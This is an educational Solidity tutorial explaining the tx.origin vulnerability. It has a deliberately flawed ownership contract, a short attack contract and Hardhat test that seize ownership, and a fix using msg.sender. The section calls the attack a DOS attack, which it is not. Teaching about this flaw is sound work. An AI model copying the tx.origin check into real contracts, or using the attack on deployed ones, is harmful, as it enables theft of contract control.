# Attack with tx.origin

`tx.origin` is a global variable which returns the address that created the original transaction. It is kind of similar to `msg.sender`, but with an important caveat. We will learn how incorrect use of tx.origin could lead to security vulnerabilities in smart contracts.

🤔 What is tx.origin?

> It is a global variable

## What is tx.origin?

`tx.origin` is a global variable which returns the address of the account which sent the transaction. Now you might be wondering then what is `msg.sender` 🤔. The difference is that `tx.origin` refers to the original external account (which is the user) that started the transaction and `msg.sender` is the immediate account that called the function and it can be an external account or another contract calling the function.

So for example, if User calls Contract A, which then calls contract B within the same transaction,`msg.sender` will be equal to `Contract A` when checked from inside `Contract B`. However, `tx.origi`n will be the `User` regardless of where you check it from.

🤔 Difference between tx.origin and msg.sender?

> msg.sender refers to the immediate account that called the function whereas tx.origin refers to the original external account that started the transaction

🤔 Can msg.sender and tx.origin have the same value sometimes?

> Yes

## DOS Attack on a smart contract

#### What will happen?

There will be two smart contracts - `Good.sol` and `Attack.sol`. `Good.sol`. Initially the owner of `Good.sol` will be a good user. Using the attack function `Attack.sol` will be able to change the owner of `Good.sol` to itself.

First, let's create a contract named `Good.sol` which is essentially a simpler version of `Ownable.sol` that we have previously used.

```sh
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract Good  {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setOwner(address newOwner) public {
        require(tx.origin == owner, "Not owner" );
        owner = newOwner;
    }
}
```

Now, create a contract named `Attack.sol` within the `contracts` directory and write the following lines of code

```sh
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good public good;
    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
```

Now lets try immitating the attack using a sample test, create a new file under `test` folder named `attack.js` and add the following lines of code to it

```sh
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Attack.sol will be able to change the owner of Good.sol", async function () {
    // Get one address
    const [_, addr1] = await ethers.getSigners();

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.connect(addr1).deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    let tx = await _attackContract.connect(addr1).attack(); // *** attack which address of user ***
    await tx.wait();

    // Now lets check if the current owner of Good.sol is actually Attack.sol
    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
```

When the user calls `attack` function with `addr1`, `tx.origin` is set to `addr1`. `attack` function further calls `setOwner` function of `Good.sol` which first checks if `tx.origin` is indeed the owner which is `true` because the original transaction was indeed called by `addr1`. After verifying the owner, it sets the owner to `Attack.sol`

And thus attacker is successfully able to change the owner of `Good.sol` 🤯

## Real Life Example
[THORChain Hack #2 here](https://rekt.news/thorchain-rekt2/)

🤔 Is it better to use msg.sender or tx.origin?

> msg.sender is better

## Prevention

- You should use msg.sender instead of tx.origin to not let this happen

Example:

```sh
function setOwner(address newOwner) public {
    require(msg.sender == owner, "Not owner" );
    owner = newOwner;
}
```





